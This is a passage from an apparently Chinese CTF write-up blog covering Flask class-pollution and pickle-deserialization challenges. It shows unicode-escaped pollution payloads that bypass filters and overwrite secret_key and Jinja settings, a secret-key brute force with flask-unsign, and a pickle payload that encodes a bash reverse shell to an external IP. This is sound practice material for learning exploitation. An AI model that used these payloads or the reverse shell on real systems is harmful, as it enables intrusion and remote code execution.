class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, session</span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> black_list</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">data</span>):</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> black_list:</span><br><span class="line">        <span class="keyword">if</span> i <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">user</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.username = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="variable language_">self</span>.password = <span class="string">&quot;&quot;</span></span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">check</span>(<span class="params">self, data</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="variable language_">self</span>.username == data[<span class="string">&#x27;username&#x27;</span>] <span class="keyword">and</span> <span class="variable language_">self</span>.password == data[<span class="string">&#x27;password&#x27;</span>]:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">Users = []</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/register&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>) </span><span class="comment"># 漏洞利用点</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            <span class="keyword">if</span> <span class="keyword">not</span> check(request.data):</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">            User = user()</span><br><span class="line">            merge(data, User)</span><br><span class="line">            Users.append(User)</span><br><span class="line">        <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Success&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Register Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/login&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            data = json.loads(request.data)</span><br><span class="line">            <span class="keyword">if</span> <span class="string">&quot;username&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data <span class="keyword">or</span> <span class="string">&quot;password&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> data:</span><br><span class="line">                <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">            <span class="keyword">for</span> user <span class="keyword">in</span> Users:</span><br><span class="line">                <span class="keyword">if</span> user.check(data):</span><br><span class="line">                    session[<span class="string">&quot;username&quot;</span>] = data[<span class="string">&quot;username&quot;</span>]</span><br><span class="line">                    <span class="keyword">return</span> <span class="string">&quot;Login Success&quot;</span></span><br><span class="line">        <span class="keyword">except</span> Exception:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;Login Failed&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">open</span>(__file__, <span class="string">&quot;r&quot;</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5010</span>)</span><br></pre></td></tr></table></figure><p>&#x2F;register路由，有merge合并函数，可以进行python的原型链污染。</p><img src="/CTFwp/DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/image-20250713090121324.png" class="" title="image-20250713090121324"><p>先通过_static_folder将.&#x2F;目录映射到static目录，读取secret.py文件：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">black_list = [b&#x27;__init__&#x27;, b&#x27;jinja&#x27;, b&#x27;black_list&#x27;]</span><br></pre></td></tr></table></figure><p>过滤的内容也不是很多。</p><img src="/CTFwp/DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/image-20250713090145666.png" class="" title="image-20250713090145666"><p>接着将..&#x2F;目录映射到static目录，可以读取&#x2F;根目录下的任意文件，相当于任意文件读。</p><p>解法1：docker的pid进程默认为1，我们通过&#x2F;proc&#x2F;1&#x2F;environ查看环境变量。</p><img src="/CTFwp/DASCTF-2023-0X401%E4%B8%83%E6%9C%88%E6%9A%91%E6%9C%9F%E6%8C%91%E6%88%98%E8%B5%9B/image-20250713090250268.png" class="" title="image-20250713090250268"><p>解法2：flask算pin。</p><p>反思：原型链污染这里的知识点，没有问题，我现在缺少对于任意文件读相关的知识点和方法。相关的知识点：<a href="https://baozongwi.xyz/2024/10/19/DASCTF-2024%E9%87%91%E7%A7%8B%E5%8D%81%E6%9C%88/">任意文件读</a></p>]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XGCTF 2024</title>
      <link href="/CTFwp/XGCTF-2024/"/>
      <url>/CTFwp/XGCTF-2024/</url>
      
        <content type="html"><![CDATA[<h2 id="easy-polluted"><a href="#easy-polluted" class="headerlink" title="easy_polluted"></a>easy_polluted</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, session, redirect, url_for,request,render_template</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_md5</span>():</span><br><span class="line">    random_string = os.urandom(<span class="number">16</span>)</span><br><span class="line">    md5_hash = hashlib.md5(random_string)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> md5_hash.hexdigest()</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">filter</span>(<span class="params">user_input</span>):</span><br><span class="line">    blacklisted_patterns = [<span class="string">&#x27;init&#x27;</span>, <span class="string">&#x27;global&#x27;</span>, <span class="string">&#x27;env&#x27;</span>, <span class="string">&#x27;app&#x27;</span>, <span class="string">&#x27;_&#x27;</span>, <span class="string">&#x27;string&#x27;</span>]</span><br><span class="line">    <span class="keyword">for</span> pattern <span class="keyword">in</span> blacklisted_patterns:</span><br><span class="line">        <span class="keyword">if</span> re.search(pattern, user_input, re.IGNORECASE):</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">merge</span>(<span class="params">src, dst</span>):</span><br><span class="line">    <span class="comment"># Recursive merge function</span></span><br><span class="line">    <span class="keyword">for</span> k, v <span class="keyword">in</span> src.items():</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(dst, <span class="string">&#x27;__getitem__&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> dst.get(k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">                merge(v, dst.get(k))</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                dst[k] = v</span><br><span class="line">        <span class="keyword">elif</span> <span class="built_in">hasattr</span>(dst, k) <span class="keyword">and</span> <span class="built_in">type</span>(v) == <span class="built_in">dict</span>:</span><br><span class="line">            merge(v, <span class="built_in">getattr</span>(dst, k))</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">setattr</span>(dst, k, v)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line">app.secret_key = generate_random_md5()</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">evil</span>():</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    username = request.form.get(<span class="string">&#x27;username&#x27;</span>)</span><br><span class="line">    password = request.form.get(<span class="string">&#x27;password&#x27;</span>)</span><br><span class="line">    session[<span class="string">&quot;username&quot;</span>] = username</span><br><span class="line">    session[<span class="string">&quot;password&quot;</span>] = password</span><br><span class="line">    Evil = evil()</span><br><span class="line">    <span class="keyword">if</span> request.data:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">filter</span>(<span class="built_in">str</span>(request.data)):</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;NO POLLUTED!!!YOU NEED TO GO HOME TO SLEEP~&quot;</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            merge(json.loads(request.data), Evil) <span class="comment"># Polluted</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;MYBE YOU SHOULD GO /ADMIN TO SEE WHAT HAPPENED&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span>,methods=[<span class="string">&#x27;POST&#x27;</span>, <span class="string">&#x27;GET&#x27;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">templates</span>():</span><br><span class="line">    username = session.get(<span class="string">&quot;username&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    password = session.get(<span class="string">&quot;password&quot;</span>, <span class="literal">None</span>)</span><br><span class="line">    <span class="keyword">if</span> username <span class="keyword">and</span> password:</span><br><span class="line">        <span class="keyword">if</span> username == <span class="string">&quot;adminer&quot;</span> <span class="keyword">and</span> password == app.secret_key:</span><br><span class="line">            <span class="comment"># session 伪造</span></span><br><span class="line">            <span class="keyword">return</span> render_template(<span class="string">&quot;flag.html&quot;</span>, flag=<span class="built_in">open</span>(<span class="string">&quot;../flag&quot;</span>, <span class="string">&quot;rt&quot;</span>).read())</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Unauthorized&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&#x27;Hello,  This is the POLLUTED page.&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    app.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">5000</span>)</span><br></pre></td></tr></table></figure><p>通过代码审计发现&#x2F;路由进行污染，&#x2F;admin路由 if判断为True，进行渲染。</p><p>通过filter过滤了一些内容，json.loads可以解析unicode编码，可以通过unicode编码绕过。(搬起石头砸自己脚)</p><p>先污染secret_key:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;:&#123;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;:&#123;&quot;\u0061\u0070\u0070&quot;:&#123;&quot;\u0073\u0065\u0063\u0072\u0065\u0074\u005f\u006b\u0065\u0079&quot;:&quot;1&quot;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/XGCTF-2024/image-20250711110313445.png" class="" title="image-20250711110313445"><p>flag.html:</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">html</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">&quot;en&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">&quot;UTF-8&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>index<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">    这又是什么jinja语法啊！</span><br><span class="line">    [#flag#] </span><br><span class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure><p>我们还要污染jinja_env的variable_start_string和variable_end_string。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;\u005f\u005f\u0069\u006e\u0069\u0074\u005f\u005f&quot;:&#123;&quot;\u005f\u005f\u0067\u006c\u006f\u0062\u0061\u006c\u0073\u005f\u005f&quot;:&#123;&quot;\u0061\u0070\u0070&quot;:&#123;&quot;\u006a\u0069\u006e\u006a\u0061\u005f\u0065\u006e\u0076&quot;:&#123;&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0073\u0074\u0061\u0072\u0074\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;:&quot;[#&quot;,&quot;\u0076\u0061\u0072\u0069\u0061\u0062\u006c\u0065\u005f\u0065\u006e\u0064\u005f\u0073\u0074\u0072\u0069\u006e\u0067&quot;:&quot;#]&quot;&#125;&#125;&#125;&#125;&#125;</span><br></pre></td></tr></table></figure><img src="/CTFwp/XGCTF-2024/image-20250711110529775.png" class="" title="image-20250711110529775"><p>访问&#x2F;admin路由前进行session伪造：</p><img src="/CTFwp/XGCTF-2024/image-20250711110647999.png" class="" title="image-20250711110647999"><img src="/CTFwp/XGCTF-2024/image-20250711110817313.png" class="" title="image-20250711110817313"><p>注意：</p><ul><li><code>如果给附件了，建议先在本地复现，复现成功后，再打远程</code></li><li><code>在进行密钥污染时，必须污染为字符串，而不是其他类型</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> CTFwp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTFwp </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>pickle</title>
      <link href="/pickle/pickle/"/>
      <url>/pickle/pickle/</url>
      
        <content type="html"><![CDATA[<h2 id="MTCTF-2022-easypickle"><a href="#MTCTF-2022-easypickle" class="headerlink" title="[MTCTF_2022]easypickle"></a>[MTCTF_2022]easypickle</h2><p>&#x2F;路由:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hello_world</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&#x27;user&#x27;</span>):</span><br><span class="line">        session[<span class="string">&#x27;user&#x27;</span>] = <span class="string">&#x27;&#x27;</span>.join(random.choices(<span class="string">&quot;admin&quot;</span>, k=<span class="number">5</span>))</span><br><span class="line">        <span class="comment">#长度为5，每个位置在‘admin&#x27;随机找一个</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;Hello &#123;&#125;!&#x27;</span>.<span class="built_in">format</span>(session[<span class="string">&#x27;user&#x27;</span>])</span><br></pre></td></tr></table></figure><p>&#x2F;admin路由：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/admin&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">admin</span>():</span><br><span class="line">    <span class="keyword">if</span> session.get(<span class="string">&#x27;user&#x27;</span>) != <span class="string">&quot;admin&quot;</span>: <span class="comment"># 检测用户是否为admin</span></span><br><span class="line">        <span class="keyword">return</span> <span class="string">f&quot;&lt;script&gt;alert(&#x27;Access Denied&#x27;);window.location.href=&#x27;/&#x27;&lt;/script&gt;&quot;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            a = base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>)).replace(<span class="string">b&quot;builtin&quot;</span>, <span class="string">b&quot;BuIltIn&quot;</span>).replace(<span class="string">b&quot;os&quot;</span>, <span class="string">b&quot;Os&quot;</span>).replace(<span class="string">b&quot;bytes&quot;</span>, <span class="string">b&quot;Bytes&quot;</span>)</span><br><span class="line">            <span class="comment"># 对session的ser_data的值先进行base64解码，如果有builtin和os和bytes，替换它们的值</span></span><br><span class="line">            <span class="comment"># 禁止了builtins os bytes</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&#x27;R&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;i&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;o&#x27;</span> <span class="keyword">in</span> a <span class="keyword">or</span> <span class="string">b&#x27;b&#x27;</span> <span class="keyword">in</span> a:</span><br><span class="line">                <span class="comment"># 禁止 R i o b</span></span><br><span class="line">                <span class="keyword">raise</span> pickle.UnpicklingError(<span class="string">&quot;R i o b is forbidden&quot;</span>)</span><br><span class="line">            pickle.loads(base64.b64decode(session.get(<span class="string">&#x27;ser_data&#x27;</span>))) <span class="comment"># 并不是用替换后的进行反序列化，而是反序列化原始数据。</span></span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;ok&quot;</span> <span class="comment"># 无回显</span></span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;error!&quot;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>从代码分析：注入点在session里面，所以我们第一步：先拿key密钥伪造session。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br></pre></td></tr></table></figure><p>2位，可以考虑一下爆破。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;./key.txt&#x27;</span>,<span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1000000</span>):</span><br><span class="line">        data = os.urandom(<span class="number">2</span>).<span class="built_in">hex</span>()</span><br><span class="line">        f.write(<span class="string">f&quot;\&quot;<span class="subst">&#123;data&#125;</span>\&quot;&quot;</span>+<span class="string">&quot;\n&quot;</span>) <span class="comment">#必须要用&quot;&quot;包裹住数据。 </span></span><br></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">flask-unsign --unsign --cookie <span class="string">&quot;eyJ1c2VyIjoiaW5hbmEifQ.aGcv6w.ES6J2y5h1GTL9DfjyM-kpgpsoLQ&quot;</span> --wordlist key.txt</span><br></pre></td></tr></table></figure><img src="/pickle/pickle/image-20250704094730777.png" class="" title="image-20250704094730777"><img src="/pickle/pickle/image-20250704094910420.png" class="" title="image-20250704094910420"><p>接下里就是写payload：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># R i o b </span></span><br><span class="line"><span class="comment"># 前面我们在分析代码的时候说过，最终用的还是原始数据，而非替换后的数据。</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;(cos\n</span></span><br><span class="line"><span class="string">system\n</span></span><br><span class="line"><span class="string">Vcalc\n</span></span><br><span class="line"><span class="string">o.&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># o指令被禁了</span></span><br><span class="line"><span class="comment"># pickle里面有s指令，看看s指令干啥的</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">load_setitem</span>(<span class="params">self</span>):</span><br><span class="line">        stack = <span class="variable language_">self</span>.stack</span><br><span class="line">        value = stack.pop() <span class="comment"># 从栈中弹出一个元素</span></span><br><span class="line">        key = stack.pop() <span class="comment"># 从栈中弹出一个元素</span></span><br><span class="line">        <span class="built_in">dict</span> = stack[-<span class="number">1</span>] <span class="comment"># dict的地址指向stack[-1],改变dict,stack[-1]也会改变</span></span><br><span class="line">        <span class="built_in">dict</span>[key] = value <span class="comment"># 给dict的key键赋值</span></span><br><span class="line"><span class="comment"># 我们将s指令插入到o指令后面。</span></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">Vcalc</span></span><br><span class="line"><span class="string">os.&#x27;&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&#x27;&#x27;&#x27;&#125;Vkey</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">Vcalc</span></span><br><span class="line"><span class="string">os.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="comment"># replace将os中的o替换为大写O</span></span><br><span class="line"><span class="comment"># 就可以绕过o指令的检测</span></span><br><span class="line"><span class="comment"># &#125;Vkey 这主要是为了不让最后的s指令报错。</span></span><br></pre></td></tr></table></figure><p>在本地试了试，确实可以弹出计算器：</p><img src="/pickle/pickle/image-20250704111850105.png" class="" title="image-20250704111850105"><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"></span><br><span class="line">payload = <span class="string">b&#x27;&#x27;&#x27;&#125;Vkey</span></span><br><span class="line"><span class="string">(cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">V\u0062\u0061\u0073\u0068\u0020\u002D\u0063\u0020\u0022\u0062\u0061\u0073\u0068\u0020\u002D\u0069\u0020\u003E\u0026\u0020\u002F\u0064\u0065\u0076\u002F\u0074\u0063\u0070\u002F\u0034\u0033\u002E\u0031\u0035\u0034\u002E\u0032\u0035\u0033\u002E\u0031\u0039\u0039\u002F\u0033\u0039\u0036\u0036\u0036\u0020\u0030\u003E\u0026\u0031\u0022</span></span><br><span class="line"><span class="string">os.</span></span><br><span class="line"><span 